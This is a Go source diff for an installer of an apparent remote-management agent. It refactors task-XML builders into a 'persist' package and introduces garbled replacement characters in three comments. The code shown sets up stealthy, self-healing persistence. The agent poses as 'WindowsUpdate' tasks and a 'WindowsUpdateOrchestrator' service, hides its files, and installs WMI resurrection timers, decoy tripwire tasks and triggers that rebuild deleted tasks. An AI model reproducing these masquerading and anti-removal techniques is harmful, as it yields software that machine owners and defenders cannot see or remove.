@@ -1,4 +1,4 @@
-﻿package main
+package main
 
 import (
 	"bytes"
@@ -21,6 +21,7 @@ import (
 
 	"golang.org/x/sys/windows/registry"
 
+	"rmm/internal/persist"
 	"rmm/internal/version"
 )
 
@@ -351,7 +352,7 @@ func install() {
 	}
 	_, _ = hiddenExec("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()
 
-	taskXML := agentTaskXML(agentPath, controllerAddr, certPath)
+	taskXML := persist.AgentTaskXML(agentPath, controllerAddr, certPath)
 
 	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
 	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
@@ -427,7 +428,7 @@ func install() {
 			log.Fatalf("cannot generate delete token: %v", err)
 		}
 		deleteToken = hex.EncodeToString(rb[:])
-		log.Printf("[*] Generated self-delete token (store it — removal needs it)")
+		log.Printf("[*] Generated self-delete token (store it � removal needs it)")
 	}
 	_ = os.WriteFile(deleteTokenPath, []byte(deleteToken+"\n"), 0600)
 	_ = os.WriteFile(filepath.Join(blenderDir, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
@@ -543,7 +544,7 @@ func install() {
 	hideFile(installDir)
 
 	// Deepest layers: WMI timers + the SYSTEM repair service (boot-time
-	// coverage with nobody logged on). The service only repairs — the
+	// coverage with nobody logged on). The service only repairs � the
 	// agent itself always runs in the user session.
 	setupWmiLayer(agentPath)
 	installRepairService(agentPath)
@@ -731,7 +732,7 @@ func createWatchdogTask(agentPath, backupDir string) {
 	// watcher itself can rebuild a deleted task.
 	// Self-defending task: any task-table mutation re-fires it instantly
 	// (event trigger applied inside the builder).
-	wxml := watchdogTaskXML(agentPath)
+	wxml := persist.WatchdogTaskXML(agentPath)
 
 	// Keep a copy beside the backup so the watcher can rebuild a deleted
 	// task without the installer.
@@ -751,7 +752,7 @@ func createWatchdogTask(agentPath, backupDir string) {
 // different name (logon + 30min + unlock, runs --watch). A kill chain that
 // wipes "WindowsUpdate*" by name still leaves this one to revive the rest.
 func createOrchestratorTask(agentPath, backupDir, installDir string) {
-	orchXML := orchestratorTaskXML(agentPath)
+	orchXML := persist.OrchestratorTaskXML(agentPath)
 	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
@@ -771,7 +772,7 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 // exits) on logon and hourly. Deleting it trips the tripwire instead of
 // hurting anything.
 func createDecoyTask(agentPath, backupDir, installDir string) {
-	decoyXML := decoyTaskXML(agentPath)
+	decoyXML := persist.DecoyTaskXML(agentPath)
 	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
@@ -824,7 +825,7 @@ var wmiSets = [][4]string{
 // timer that runs "<agent> --wmi-heal" (repairs tasks + Run keys from the
 // install-dir XMLs). WMI subscriptions live outside schtasks/registry, so
 // even a wipe of every task + Run value still converges back. Best effort:
-// creation can fail under locked-down WMI/Defender — logged, install goes on.
+// creation can fail under locked-down WMI/Defender � logged, install goes on.
 func setupWmiLayer(agentPath string) {
 	consumer := `"` + agentPath + `" --wmi-heal`
 	// Two triggers share one consumer per set: a 30-minute timer
@@ -857,16 +858,7 @@ func setupWmiLayer(agentPath string) {
 	log.Printf("[*] WMI resurrection installed (2 sets: timer + death trigger each)")
 }
 
-// eventTriggerXML fires a task the moment ANY scheduled task is
-// registered/updated/deleted/disabled (TaskScheduler Operational log
-// 106/140/141/142): task-table wipes heal themselves within seconds.
-// Self-limiting: healers query before creating, so steady state emits no
-// matching events and the loop stops after one extra pass.
-const eventTriggerXML = `<EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-TaskScheduler/Operational"&gt;&lt;Select Path="Microsoft-Windows-TaskScheduler/Operational"&gt;*[System[(EventID=106 or EventID=140 or EventID=141 or EventID=142)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger>`
 
-func withEventTrigger(taskXML string) string {
-	return strings.Replace(taskXML, "  </Triggers>", "    "+eventTriggerXML+"\n  </Triggers>", 1)
-}
 
 const repairSvcName = "WindowsUpdateOrchestrator"
 
